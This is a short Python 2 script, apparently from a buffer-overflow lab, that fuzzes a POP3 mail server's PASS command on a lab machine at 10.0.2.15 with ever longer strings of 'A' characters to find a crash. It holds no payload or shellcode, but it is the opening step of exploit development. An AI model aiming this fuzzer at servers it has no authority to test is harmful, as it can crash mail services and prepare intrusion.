#!/usr/bin/python
import socket

# Array of A's
buff = ["A"]
counter = 100

#Loop to build array
while len(buff) <= 30:
    buff.append("A"*counter)
    counter = counter+200

#Attempt to login to mail
for string in buff:
    print "Fuzzing PASS with %s bytes" % len(string)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#Connect to Win7 machine
    connect = s.connect(('10.0.2.15', 110))
    s.recv(1024)
    s.send('USER username\r\n')
    s.recv(1024)
    s.send('PASS ' + string + '\r\n')
    s.send('QUIT\r\n')
    s.close()
